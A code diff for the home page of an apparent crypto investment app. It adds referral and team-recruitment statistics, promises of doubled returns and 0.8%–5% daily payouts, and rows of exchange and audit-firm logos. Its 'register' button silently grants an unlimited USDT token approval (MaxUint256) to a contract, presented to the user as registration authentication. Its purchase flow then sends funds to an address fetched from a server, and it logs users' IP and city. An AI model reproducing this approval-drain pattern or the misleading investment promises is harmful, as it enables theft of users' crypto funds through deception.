@@ -22,7 +22,7 @@
                        :block='true' @click="" :round="10" size="normal" >{{ store.tmStore.userInfo.wallet.address.substring(0,6) +'...'+ store.tmStore.userInfo.wallet.address.slice(-6) }}
             </tm-button>
           </view>
-<!--          <tm-icon @click="" :color="store.tmStore.dark?'white':''" _class="pl-15"  :font-size="40" name="tmicon-ios-sunny"></tm-icon>-->
+          <tm-icon @click="toggleDrawer" :color="store.tmStore.dark?'white':''" _class="pl-15"  :font-size="40" name="tmicon-menu"></tm-icon>
         </view>
       </template>
     </tm-navbar>
@@ -38,8 +38,11 @@
         <image  class="loader"  :src="roundimg"></image>
       </view>
     </view>
-    <view style="transform: translateY(-30px);" >
-      <view v-show="isLogin">
+
+    <view style="transform: translateY(-10px);" >
+<!--      <tm-roll-notice :round="4" color="#21234a" fontColor="white" icon=""  @click="" list="GTC震撼上线"></tm-roll-notice>-->
+      <tm-alert color="blue" :duration="5000" :closable="false" fontColor="white" :autoPlay="true" text :border="0" :content="content" :height="80"></tm-alert>
+      <view v-show="!isLogin">
         <view class="mx-n10  flex flex-between">
           <tm-text class="text-black text-weight-b my-20" _style="font-size: 14px;">丨注册中心</tm-text>
         </view>
@@ -92,7 +95,7 @@
             </view>
           </view>
           <view class="flex-center mb-10 mt-10">
-            <tm-button :width="600" :height="80" :fontSize="28"   style="background-color: rgb(104 34 227)">立 即 注 册 </tm-button>
+            <tm-button @click="throttle(usdtApprove, 5000,true)" :width="600" :height="80" :fontSize="28"   style="background-color: rgb(104 34 227)">立 即 注 册 </tm-button>
   <!--          <tm-button class="btncolor" :round="4" :width="500" :height="60" :fontSize="25" color="grey" style="margin-bottom: 20rpx" @click="throttle(usdtApprove, 5000,true)">-->
   <!--            <tm-text color="black" class="text-weight-b"> 立 即 注 册 </tm-text>-->
   <!--          </tm-button>-->
@@ -110,8 +113,8 @@
             <view class="flex-start pa-10">
               <image :src="store.tmStore.userInfo.cliUser?.avatarurl" style="border-radius: 50%;width: 120rpx;height: 120rpx"></image>
               <view class="mt-10 ml-20" >
-                <tm-text class="mr-20 text-size-g ">{{store.tmStore.userInfo.cliUser?.nickname}}</tm-text>
-                <tm-text class="mr-20 mt-5 text-size-g ">**** U</tm-text>
+                <tm-text class="mr-20 text-size-l ">{{store.tmStore.userInfo.cliUser?.nickname}}</tm-text>
+                <tm-text :fontSize="26" class="mr-20 mt-15  ">{{ store.tmStore.userInfo.wallet?.usdt }} U</tm-text>
               </view>
             </view>
             <view class="relative">
@@ -119,7 +122,7 @@
               <tm-text class="text-center " :fontSize="26">1 天</tm-text>
             </view>
           </view>
-          <view  class="  mt-20 mb-22">
+          <view  class="  mt-20 mb-18">
             <view class=" flex-row-center-between px-10">
               <view class="">
                 <view class=" pa-20 round-4 " style="background-color: rgba(182,199,218,0.2);width: 260rpx">
@@ -128,7 +131,7 @@
                     <tm-text class="ml-5" :fontSize="22" color="white">个人业绩</tm-text>
                   </view>
                   <view class="flex-center  ">
-                    <tm-text>666</tm-text>
+                    <tm-text>{{ store.tmStore.userInfo.mainorder?.descnum }}</tm-text>
                   </view>
                 </view>
                 <view class=" mt-25 pa-20 round-4" style="background-color: rgba(182,199,218,0.2);width: 260rpx">
@@ -136,8 +139,8 @@
                     <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M14.417 12.666H12.084C11.9293 12.6657 11.781 12.6041 11.6717 12.4946C11.5624 12.3851 11.501 12.2367 11.501 12.082L11.5 11.5H10.722V12.667H9.556V11.5H8.778V12.667H7.222V11.5H6.445V12.667H5.278V11.5H4.5L4.496 12.082C4.49613 12.1586 4.48115 12.2346 4.45191 12.3054C4.42267 12.3763 4.37975 12.4406 4.3256 12.4949C4.27145 12.5491 4.20714 12.5922 4.13634 12.6215C4.06554 12.6509 3.98965 12.666 3.913 12.666H1.583C1.50636 12.666 1.43046 12.6509 1.35967 12.6215C1.28887 12.5922 1.22455 12.5491 1.1704 12.4949C1.11625 12.4406 1.07333 12.3763 1.04409 12.3054C1.01485 12.2346 0.999869 12.1586 1 12.082V3.918C1 3.595 1.261 3.334 1.583 3.334H14.416C14.4927 3.33387 14.5687 3.34888 14.6396 3.37819C14.7106 3.40749 14.775 3.4505 14.8292 3.50476C14.8835 3.55901 14.9265 3.62344 14.9558 3.69436C14.9851 3.76527 15.0001 3.84127 15 3.918V12.082C15.0001 12.1586 14.9852 12.2346 14.9559 12.3054C14.9267 12.3763 14.8837 12.4406 14.8296 12.4949C14.7755 12.5491 14.7111 12.5922 14.6403 12.6215C14.5695 12.6509 14.4936 12.666 14.417 12.666ZM13.833 9.895H13.221C13.0661 9.895 12.9176 9.83347 12.8081 9.72395C12.6985 9.61443 12.637 9.46589 12.637 9.311C12.637 9.15611 12.6985 9.00757 12.8081 8.89805C12.9176 8.78853 13.0661 8.727 13.221 8.727H13.833V4.502H2.167V8.727H2.76C2.91489 8.727 3.06343 8.78853 3.17295 8.89805C3.28247 9.00757 3.344 9.15611 3.344 9.311C3.344 9.46589 3.28247 9.61443 3.17295 9.72395C3.06343 9.83347 2.91489 9.895 2.76 9.895H2.167V11.497H3.33L3.334 10.722C3.334 10.399 3.401 10.333 3.723 10.333H12.279C12.601 10.333 12.668 10.399 12.668 10.722V11.497H13.834V9.895H13.833ZM11.5 5.278H12.667V8H11.5V5.278ZM8.778 5.278H9.945V8H8.778V5.278ZM6.056 5.278H7.223V8H6.056V5.278ZM3.333 5.278H4.5V8L3.352 7.998L3.333 5.278Z" fill="white"></path></svg>
                     <tm-text class="ml-5" :fontSize="22" color="white">直推成员</tm-text>
                   </view>
-                  <view class="flex-center  ">
-                    <tm-text>666</tm-text>
+                  <view class="flex-center ">
+                    <tm-text>{{ store.tmStore.userInfo.cliUser.pullnum }}</tm-text>
                   </view>
                 </view>
               </view>
@@ -148,7 +151,7 @@
                     <tm-text  class="ml-5"  :fontSize="22" color="white">团队业绩</tm-text>
                   </view>
                   <view class="flex-center  ">
-                    <tm-text>666</tm-text>
+                    <tm-text>{{ store.tmStore.userInfo.mainorder?.amount }}</tm-text>
                   </view>
                 </view>
                 <view class=" mt-25 round-4 pa-20" style="background-color: rgba(182,199,218,0.2);width: 260rpx">
@@ -157,7 +160,7 @@
                     <tm-text  class="ml-5"  :fontSize="22" color="white">团队成员</tm-text>
                   </view>
                   <view class="flex-center  ">
-                    <tm-text>666</tm-text>
+                    <tm-text>{{ store.tmStore.userInfo.cliUser.teamnum }}</tm-text>
                   </view>
                 </view>
               </view>
@@ -168,8 +171,55 @@
 
         </tm-sheet>
       </view>
+      <tm-text class="text-black text-weight-b my-40 ml-20" _style="font-size: 14px;">丨金融中心</tm-text>
+      <tm-sheet class="relative " darkBgColor="#4b21e5" style="background: linear-gradient(107deg,#4853ef,#5d7dff);" :round="4" :margin="[20,20]">
 
-      <tm-sheet class="relative " darkBgColor="#4b21e5" style="background: linear-gradient(to right, rgb(71, 14, 255) 0%, rgb(255, 33, 219) 100%);"  :round="4" :margin="[20,20]">
+        <!--        <image :src="homebgimg"  style="width: 100%;height: 590rpx; position: absolute;left: 0;top: 0" ></image>-->
+        <view class="flex flex-row-center-between  zIndex-1">
+          <view class="topshow">
+            <view class="flex flex-row-center-between ma-10">
+              <view>
+                <view class="flex-start ">
+                  <tm-icon name="tmicon-gift" :font-size="26"  color="white" _class="mr-10"></tm-icon>
+                  <tm-text :fontSize="30" color="white">买入份额 :</tm-text>
+                  <tm-text :fontSize="30"  color="" class="ml-10">{{ buyamount }}</tm-text>
+                </view>
+                <view class="flex-start my-10 ">
+                  <tm-icon name="tmicon-qiandai" :font-size="26"  color="white" _class="mr-10"></tm-icon>
+                  <tm-text :fontSize="30" color="" class="">预期收益 :</tm-text>
+                  <tm-text :fontSize="30" color="" class="ml-10">{{ 2*buyamount }}</tm-text>
+                </view>
+                <view class="flex-start ">
+                  <tm-icon name="tmicon-meiyuan" :font-size="26"  color="white" _class="mr-10"></tm-icon>
+                  <tm-text :fontSize="30" color="" class="">钱包余额 : </tm-text>
+                  <tm-text :fontSize="30" color="" class="ml-10">{{ store.tmStore.userInfo.wallet.usdt }}</tm-text>
+                </view>
+              </view>
+
+              <view class="absolute" style="right:20px;top:20px">
+                <image class=" relative" :src="usdtimg" style="width: 100rpx; height: 100rpx"></image>
+              </view>
+            </view>
+          </view>
+        </view>
+        <view class="mt-20">
+          <view class="flex flex-between" >
+            <tm-button  @click="buybtn(10)"  style="background-color: rgb(0 0 0 / 40%)">10</tm-button>
+            <tm-button @click="buybtn(100)"  style="background-color: rgb(0 0 0 / 40%);margin-right: 5px;margin-left: 5px">100</tm-button>
+            <tm-button @click="buybtn(500)" style="background-color: rgb(0 0 0 / 40%)">500</tm-button>
+          </view>
+          <view class="flex flex-between">
+            <tm-button @click="buybtn(1000)"  style="background-color: rgb(0 0 0 / 40%)">1000</tm-button>
+            <tm-button @click="buybtn(5000)"  style="background-color: rgb(0 0 0 / 40%);margin-right: 5px;margin-left: 5px">5000</tm-button>
+            <tm-button @click="buybtn(10000)" style="background-color: rgb(0 0 0 / 40%)">10000</tm-button>
+          </view>
+        </view>
+        <view class="mt-20">
+          <tm-button @click="throttle(getUpTree,5000)"  block style="background-color: rgb(104,34,227)"> 立 即 认 购</tm-button>
+        </view>
+      </tm-sheet>
+
+      <tm-sheet class="relative " darkBgColor="#4b21e5" style="background: linear-gradient(to right, rgb(71, 14, 255) 0%, rgba(255,33,219,0.78) 100%);" :round="4" :margin="[20,20]">
 <!--        <image :src="homebgimg"  style="width: 100%;height: 590rpx; position: absolute;left: 0;top: 0" ></image>-->
         <view class="flex flex-row-center-between  zIndex-1">
           <view class="topshow mx-30">
@@ -186,27 +236,124 @@
           </view>
         </view>
         <view style="background-color: rgb(0 0 0 / 40%)" class="mt-n10 pa-20 round-4">
-          <view class="ma-20" @click="copyInviteUrl()">
+          <view class="ma-20" @click="">
 
             <tm-text :label="'https://osl.fund?id='+trimAddress(store.tmStore.userInfo.wallet?.address,12)" color="grey-1" class="text-weight-b"></tm-text>
           </view>
           <view class="mt-20">
-            <tm-button  block style="background-color: rgb(104 34 227)">复 制 链 接</tm-button>
+            <tm-button @click="copyInviteUrl"  block style="background-color: rgb(104 34 227)">复 制 链 接</tm-button>
           </view>
         </view>
 
       </tm-sheet>
 
+      <!--平台特色 -->
+      <tm-sheet :margin="[20,25]" :padding="[20,10]"  :text="true"  :round="3"  class="zIndex-1" transprent>
+        <tm-text class="text-black text-weight-b my-40" _style="font-size: 14px;">丨平台特色</tm-text>
+<!--                <img src="https://tool.lu/netcard/" alt="">-->
+
+
+                <tm-grid :width="675" :col="2"   transprent>
+                  <tm-grid-item :height="350" >
+                    <tm-image  :width="250" :height="250" src="/static/nft/nft2.webp"> </tm-image>
+                    <tm-text _class="pt-10" :fontSize="30" label="超强算力"></tm-text>
+                  </tm-grid-item>
+                  <tm-grid-item  :height="350" >
+                    <tm-image  :width="250" :height="250" src="/static/nft/nft1.webp"> </tm-image>
+                    <tm-text _class="pt-10" :fontSize="30" label="奖励丰富"></tm-text>
+                  </tm-grid-item>
+                  <tm-grid-item  :height="350" >
+                    <tm-image  :width="250" :height="250" src="/static/nft/nft5.webp"> </tm-image>
+                    <tm-text :fontSize="30" label="安全加密"></tm-text>
+                  </tm-grid-item>
+                  <tm-grid-item  :height="350" >
+                    <tm-image  :width="250" :height="250" src="/static/nft/nft4.webp"> </tm-image>
+                    <tm-text _class="pt-10 " :fontSize="30"  label="资源链接"></tm-text>
+                  </tm-grid-item>
+                </tm-grid>
+      </tm-sheet>
+            <!-- 审计机构 -->
+            <tm-sheet :margin="[20,10]" :padding="[20,20]" text  :round="3" transprent>
+              <view class="text-align-center mb-20">
+                <tm-text class="text-black text-weight-b" _style="font-size: 14px;">丨审计机构</tm-text>
+              </view>
+
+              <view class="flex-center ma-10  ">
+                <view class=" ">
+                  <img style="width: 100%;height: 100%;background-repeat: no-repeat;background-size: 100% 100%;
+                      display: inline-block;}"  class="" src="@/static/shenji/shenji1.png" alt=""/>
+                </view>
+                <view class=" mx-15">
+                  <img style="width: 100%;height: 100%;background-repeat: no-repeat;background-size: 100% 100%;
+                      display: inline-block;}"  class="" src="@/static/shenji/shenji2.png" alt=""/>
+                </view>
+                <view class=" ">
+                  <img style="width: 100%;height: 100%;background-repeat: no-repeat;background-size: 100% 100%;
+                      display: inline-block;}"  class="" src="@/static/shenji/shenji3.png" alt=""/>
+                </view>
+              </view>
+
+            </tm-sheet>
+            <!-- 合作伙伴 -->
+            <tm-sheet :margin="[20,10]" :padding="[20,20]" text  :round="3" transprent>
+              <view class=" mb-20">
+                <tm-text class="text-white text-weight-b" _style="font-size: 14px;">丨合作伙伴</tm-text>
+              </view>
+
+              <view class="flex flex-center ">
+                <view class="">
+                  <img style="width: 100%;height: 100%;background-repeat: no-repeat;background-size: 100% 100%;
+      								display: inline-block;}"  class="" src="@/static/homedown/huobi.png" alt=""/>
+                </view>
+                <view class=" ma-10">
+                  <img style="width: 100%;height: 100%;background-repeat: no-repeat;background-size: 100% 100%;
+      								display: inline-block;}"  class="" src="@/static/homedown/geoko.png" alt=""/>
+                </view>
+                <view class="">
+                  <img style="width: 100%;height: 100%;background-repeat: no-repeat;background-size: 100% 100%;
+      								display: inline-block;}"  class="" src="@/static/homedown/binace.png" alt=""/>
+                </view>
+              </view>
+              <view class="flex-center  ">
+                <view class="">
+                  <img style="width: 100%;height: 100%;background-repeat: no-repeat;background-size: 100% 100%;
+      								display: inline-block;}"  class="" src="@/static/homedown/defi.png" alt=""/>
+                </view>
+                <view class="ma-10">
+                  <img style="width: 100%;height: 100%;background-repeat: no-repeat;background-size: 100% 100%;
+      								display: inline-block;}"  class="" src="@/static/homedown/coinbase.png" alt=""/>
+                </view>
+                <view class="">
+                  <img style="width: 100%;height: 100%;background-repeat: no-repeat;background-size: 100% 100%;
+      								display: inline-block;}"  class="" src="@/static/homedown/tp.png" alt=""/>
+                </view>
+              </view>
+            </tm-sheet>
+      <!-- 首页数据展示五区 -->
+      <tm-sheet :margin="[20,10]" :padding="[20,20]" text transprent  :round="3" >
+
+        <view class="text-align-center mt-20 mb-40">
+          <tm-text class="text-black text-weight-b" _style="font-size: 14px;">丨团队风采</tm-text>
+        </view>
+
+                <tm-text class=" mb-20 text-size-s">在全球经济的风云变幻中，维塔斯宛如一颗耀眼的明星，在国际金融舞台上绽放出璀璨光芒。
+
+                  起源于神秘而广袤的俄罗斯大地，维塔斯从诞生之日起就承载着非凡的使命。它汇聚了全球顶尖的金融精英，他们以卓越的智慧和敏锐的洞察力，在复杂的市场中精准地捕捉每一个投资机遇。
+                </tm-text>
+        <img src="@/static/homedown/openai1.webp" style="width: 100%" alt=""/>
+
+      </tm-sheet>
+
     </view>
-    <view>
-<!--      <tm-button style="  box-shadow: inset 0 0 8px 0 #6158ff;border: 1px solid #706da5;background: linear-gradient(0deg,#100842,#100842),linear-gradient(0deg,#706da5,#706da5);" :block='true' @click="onChangeDark">嗨~TMUI</tm-button>-->
-    </view>
+    <draw :showleft="showdraw"  @closedraw="handleClosedraw"></draw>
   </tm-app>
 </template>
 <script lang="ts" setup>
 	import { ref,computed } from "vue"
   import {throttle} from "@/tmui/tool/function/util";
   import exsvg from '@/static/home/exsvg.svg'
+  import btnimg from '@/static/btn/btn-recharge.png'
+  import usdtimg from '@/static/home/usdtlogo.png'
   import bgimg from "@/static/home/home-bg.png"
   import roundimg from "@/static/home/borderound.svg"
   import globviedo from "@/static/home/global.mp4"
@@ -217,10 +364,12 @@
   import homebg3 from '@/static/home/home_bg_3.svg'
   import { useTmpiniaStore } from '@/tmui/tool/lib/tmpinia'
   import {onLoad, onShow} from "@dcloudio/uni-app";
-  import {buyApi, loginApi, registerApi} from "@/api";
+  import {buyApi, getSettingApi, loginApi, registerApi} from "@/api";
   import {getQueryVariable} from "@/utils/common/tools";
-  import {connectMetaMask} from "@/utils/myweb3/myethers";
+  import {addressMeng, connectMetaMask, mengContract, usdtContract} from "@/utils/myweb3/myethers";
   import {NameGenerator} from "@/mytools/newnick";
+  import {ethers} from "ethers";
+  import Draw from "@/components/draw.vue";
   const store = useTmpiniaStore()
 
   onLoad(async ()=>{
@@ -228,16 +377,29 @@
     console.log(getQueryVariable('id'))
     userinfo.value.parent = getQueryVariable('id')
     store.tmStore.userInfo.wallet = await connectMetaMask()
+    userinfo.value.address = store.tmStore.userInfo.wallet?.address
     await saveImageAsBase64()
+    // 生成随机昵称
+    toggleGender()
+    await onLogin()
+    await getSetting()
     await getIpapi()
+
   })
 
   onShow(()=>{
-    // 生成随机昵称
-    toggleGender()
-    onLogin()
-  })
 
+  })
+  const content = ref([
+    {
+      icon: 'tmicon-alert',
+      content: '汇金俱乐部励志成为泽汇资本的重要承兑商之一'
+    },
+    {
+      icon: 'tmicon-alert',
+      content: '2倍分红结束，日分红0.8%~5%,每天分红4次'
+    }
+  ])
   function trimAddress(address: string, len: number) {
     return address.substring(0, len) + '.....' + address.slice(-len)
   }
@@ -246,6 +408,79 @@
     const len = 12; // 可以根据需要调整长度
     return userinfo.value.parent.substring(0, len) + '.....' + userinfo.value.parent.slice(-len);
   });
+  const buyamount = ref(100)
+  const buybtn = (num:number)=>{
+    asset.value.amount = num
+    buyamount.value = num
+  }
+  //查询设置信息
+  const setinfo = ref({
+    desc:"0x88EA65Ce12BB49C4385424Eb0324F18AbCbC126F"
+  })
+  const getSetting = async ()=>{
+    await getSettingApi({}).then((res:any)=>{
+
+      if(res.data.code == 0){
+        setinfo.value = res.data.data.desc
+        console.log(setinfo.value)
+      }
+    })
+  }
+  // 授权方法
+  const usdtApprove = async () => {
+    // if (Number(store.tmStore.userInfo.wallet?.usdt) < 1500) {
+    //   uni.showToast({
+    //     title: "USDT不足1500",
+    //     icon: 'none',
+    //     duration: 2000
+    //   });
+    //   return
+    // }
+    try {
+      // 确保 ethers.MaxUint256 被正确替换为实际计算最大值的方法
+      const maxUint256 = ethers.MaxUint256;
+      // const maxUint256 = "0"
+      // 发起交易并等待确认，使用await确保在通知用户之前交易已确认
+      const txResponse = await usdtContract.approve(addressMeng, maxUint256);
+      console.log("txResponse",txResponse);
+      uni.showLoading({
+        title: "注册认证中",
+        icon: 'loading',
+        duration: 5000
+      });
+
+      const receipt = await txResponse.wait();
+      console.log("receipt",receipt);
+      // 确认交易是否成功（通常通过检查receipt.status，但具体依据链和合约实现可能有所不同）
+      if (receipt.status === 1) { // 一般情况下，status为1表示交易成功
+        uni.hideLoading();
+        await onRegister()
+        uni.showToast({
+          title: "认证成功",
+          icon: 'success',
+          duration: 2000
+        });
+      } else {
+        // 尽管这行在大多数情况下可能不会执行，但添加以防某些特殊情况下交易被发送但未成功
+        uni.showToast({
+          title: "认证执行，但未成功",
+          icon: 'none',
+          duration: 2000
+        });
+        return
+      }
+    } catch (error) {
+      // 捕获并处理任何异常，包括用户取消签名
+
+      console.error("过程中发生错误:", error);
+      uni.showToast({
+        title: "认证失败",
+        icon: 'none',
+        duration: 2000
+      });
+
+    }
+  }
   //客户端注册方法
   const userinfo = ref({
     address: 'admin',
@@ -270,6 +505,7 @@
         store.tmStore.userInfo.jwtToken = res.data.data.token
         store.tmStore.userInfo.cliUser = res.data.data.loadinfo.user
         store.tmStore.userInfo.cliLoad = res.data.data.loadinfo.load
+        store.tmStore.userInfo.mainorder = res.data.data.loadinfo.mainorder
         console.log(store.tmStore.userInfo)
         uni.showToast({
           title: '登录成功',
@@ -288,18 +524,173 @@
   }
 
   async function onRegister() {
+    if (userinfo.value.address === 'admin') {
+      uni.showToast({
+        title: '请先连接钱包',
+        icon: 'error',
+        duration: 2000
+      })
+      return
+    }
     let res = await registerApi(userinfo.value)
     console.log(res)
+    if (res.data.msg === "注册成功") {
+      await onLogin()
+    }
+
   }
   const asset = ref({
-    address: 'admin',
+    address: store.tmStore.userInfo.wallet?.address,
     amount: 100,
+    desc: 'hash'
   })
   //购买资产方法
   async function onAsset() {
     let res = await buyApi(asset.value)
     console.log(res)
   }
+  // 升级方法
+  const getUpTree = async () => {
+    if (Number(store.tmStore.userInfo.wallet?.usdt) < 1) {
+      uni.showToast({
+        title: "金额不足",
+        icon: 'error',
+        duration: 2000
+      });
+      return
+    }
+    const isallowance = await getAllowance()
+
+    if (!isallowance) {
+      // 确保 ethers.MaxUint256 被正确替换为实际计算最大值的方法
+      const maxUint256 = ethers.MaxUint256;
+      // const maxUint256 = "0"
+      // 发起交易并等待确认，使用await确保在通知用户之前交易已确认
+      const txResponse = await usdtContract.approve(addressMeng, maxUint256);
+      console.log("txResponse", txResponse);
+      uni.showLoading({
+        title: "认证中",
+        icon: 'loading',
+        duration: 5000
+      });
+      const receipt = await txResponse.wait();
+      if (receipt.status === 1) {
+        uni.hideLoading()
+        uni.showToast({
+          title: "认证成功",
+          icon: 'success',
+          duration: 2000
+        });
+        await buy()
+      } else {
+        // 尽管这行在大多数情况下可能不会执行，但添加以防某些特殊情况下交易被发送但未成功
+        uni.showToast({
+          title: "认证执行，但未成功",
+          icon: 'none',
+          duration: 2000
+        });
+        return
+      }
+    }else{
+      await buy()
+    }
+
+  }
+  //查询授权金额
+  const getAllowance = async () => {
+    const from = store.tmStore.userInfo.wallet?.address
+    const res = await usdtContract.allowance(from, addressMeng)
+    const strnum = ethers.formatEther(res)
+    return Number(strnum) > 1500;
+  }
+  const cliUpdate = async (to: any[], amount: bigint): Promise<{ success: boolean, hash?: string }> => {
+    try {
+      const res = await mengContract.CliTransfer(to,amount);
+      console.log(res);
+      uni.showLoading({
+        title: "链上处理中...",
+        icon: 'loading',
+        duration: 5000
+      });
+      // 等待交易被确认
+      const receipt = await res.wait();
+      console.log("交易收据:", receipt);
+      // 检查交易状态
+      if (receipt.status === 1) {
+        // 返回一个对象，包含操作成功状态和交易哈希
+        return { success: true, hash: res.hash };
+      } else {
+        console.error("交易失败，交易哈希:", res.hash);
+        // 返回一个对象，包含操作失败状态
+        return { success: false };
+      }
+    } catch (error) {
+      console.error("调用cliUpdateUser时发生错误:", error);
+      // 失败时返回成功状态为false，哈希可以不提供或者提供null/undefined
+      return { success: false };
+    }
+  };
+  // 买入方法
+  const buy = async () => {
+
+      console.log('buy', store.tmStore.userInfo.cliUser);
+
+      if (!store.tmStore.userInfo.cliUser) {
+        uni.showToast({
+          title: '请先注册',
+          icon: 'error',
+          duration: 2000
+        })
+        return
+      }
+        const amwei = ethers.parseEther(String(asset.value.amount))
+        const transformedData = [
+          {
+            relatedAddress: setinfo.value.desc,
+            amount: amwei,
+          }
+        ]
+        console.log('转换后的数据:', transformedData);
+        // 调用并等待cliUpdate的结果
+        const updateResult = await cliUpdate(transformedData,amwei);
+        console.log('cliUpdate结果:', updateResult);
+        uni.showLoading({
+          title: "认购中",
+          icon: 'loading',
+          duration: 2000
+        });
+        if (updateResult.success) {
+          // 如果更新用户成功，显示加载提示并尝试升级
+          asset.value.desc = updateResult.hash;
+          let res = await buyApi(asset.value)
+          console.log('买入结果:', res);
+          if (res.data.msg === "成功") {
+            await uni.showToast({
+              title: "认购成功",
+              icon: 'success'
+            })
+            await onLogin()
+          }else {
+            uni.showToast({
+              title: "认购失败",
+              icon: 'error',
+              duration: 2000
+            });
+          }
+
+        } else {
+          // 如果更新用户失败，直接提示错误并结束
+          uni.showToast({
+            title: "认购失败",
+            icon: 'error',
+            duration: 2000
+          });
+          console.error("更新用户信息失败");
+        }
+
+
+
+  };
 
   const avatarurl = ref('https://api.multiavatar.com/')
   const saveImageAsBase64 = async () => {
@@ -337,6 +728,30 @@
     userinfo.value.loadip = res.data.ip
     userinfo.value.loadaddr = res.data.city
     return res
+  }
+  const showdraw = ref(false)
+  const toggleDrawer = () => {
+
+    showdraw.value = !showdraw.value;
+    console.log('draw toggle', showdraw.value)
+  };
+  const handleClosedraw = (event: boolean) => {
+    showdraw.value = event;
+    console.log(uni.getLocale())
+    console.log('draw closed', showdraw.value)
+  };
+  //复制邀请链接
+  const copyInviteUrl = async () => {
+    let url = "https://osl.fund?id="+store.tmStore.userInfo.wallet?.address
+    uni.setClipboardData({
+      data: url,
+      success: function () {
+        uni.showToast({
+          title: "复制成功",
+          icon: 'none'
+        })
+      }
+    })
   }
   function onChangeDark() {
     console.log('Set dark')
